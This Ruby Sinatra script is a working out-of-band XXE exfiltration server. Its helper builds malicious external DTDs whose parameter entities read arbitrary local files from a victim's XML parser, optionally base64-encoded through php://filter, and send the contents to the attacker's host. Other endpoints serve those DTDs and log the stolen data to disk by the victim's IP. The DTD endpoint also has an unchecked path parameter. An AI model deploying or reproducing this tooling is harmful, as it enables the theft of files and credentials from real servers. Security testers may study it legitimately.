#!/usr/bin/env ruby

require "base64"
require "pathname"
require "sinatra"

def dtd(uri, file, qs = "")
    fileuri = "file://"
    case qs
    when /^(.+&)?b=/
        fileuri = "php://filter/convert.base64-encode/resource="
    end
    qs += "&" if (!qs.empty?)
    qs.gsub!(/&/, "&amp;")
    ret = [
        "<!ENTITY % p SYSTEM \"#{fileuri}#{file}\">\n",
        "<!ENTITY % load \"",
        "<!ENTITY &#x25; run SYSTEM 'http://#{uri}/?#{qs}p=%p;'>",
        "\">\n"
    ].join
    # puts "\n#{ret}\n"
    return ret
end

set(:bind, "0.0.0.0") # List on all IPv4 interfaces
set(:port, ARGV[0] || 8080) # Listen on specified port (default: 8080)

get("/") do
    payload = params[:p] || ""
    return "" if (payload.empty?)

    base64 = !params[:b].nil?
    payload = Base64.decode64(payload.gsub(/\s+/, "+")) if (base64)

    File.open("files/#{request.ip}_#{Time.now.to_i}", "w") do |f|
        f.write("#{payload}\n")
    end
end

get("/dtd") do
    f = Pathname.new("dtd/#{params[:d]}.dtd").expand_path
    return f.read if (f.exist?)
    return ""
end

get("/xml") do
    return "" if (params[:f].nil?)
    return dtd("#{request.host}:#{request.port}", params[:f])
end

get("/xmlb") do
    return "" if (params[:f].nil?)
    return dtd("#{request.host}:#{request.port}", params[:f], "b=")
end
